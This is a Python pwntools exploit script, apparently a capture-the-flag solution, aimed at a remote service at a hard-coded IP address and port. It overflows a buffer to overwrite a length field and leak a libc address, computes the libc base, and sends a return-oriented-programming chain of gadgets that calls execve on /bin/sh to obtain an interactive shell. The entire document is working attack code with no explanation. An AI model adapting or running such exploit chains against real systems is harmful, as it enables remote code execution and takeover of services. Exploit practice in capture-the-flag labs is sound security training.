from pwn import *

io = remote("94.237.54.42",31360)


io.recvuntil(b'>>')
io.sendline(b'4')
io.recvuntil(b'>>')
io.sendline(b'CCCCCCCCCCCC')
io.recvuntil(b'>>')
#Overwrite the kana length to be 0xf0 instead
io.sendline(b'A'*92+b'\xc7'+p8(0xf0))

#Receive leak
io.recvuntil(b' : ')
libc_leak = u64(io.recvline()[0x78:0x80])
libc_base = libc_leak - 0x29d90
print(f"LIBC LEAK: {libc_base:#x}")

#Calc gadgets
poprdi = p64(libc_base+0x000000000002a3e5)
poprsi = p64(libc_base+0x000000000002be51)
poprdx = p64(libc_base+0x000000000011f497)
poprax = p64(libc_base+0x0000000000045eb0)
binsh = p64(libc_base+0x001d8698)
syscall = p64(libc_base+0x0000000000091396)


#Pop shell
io.recvuntil(b'>>')
padding = b'A'*92+b'\x5d\x00\x00\x00'+b'B'*23

payload = [
    padding,
    poprdi,
    binsh,
    poprsi,
    p64(0),
    poprdx,
    p64(0),
    p64(0xdeadbeef),
    poprax,
    p64(59),
    syscall
]
payload = b''.join(payload)
io.sendline(payload)

io.interactive()
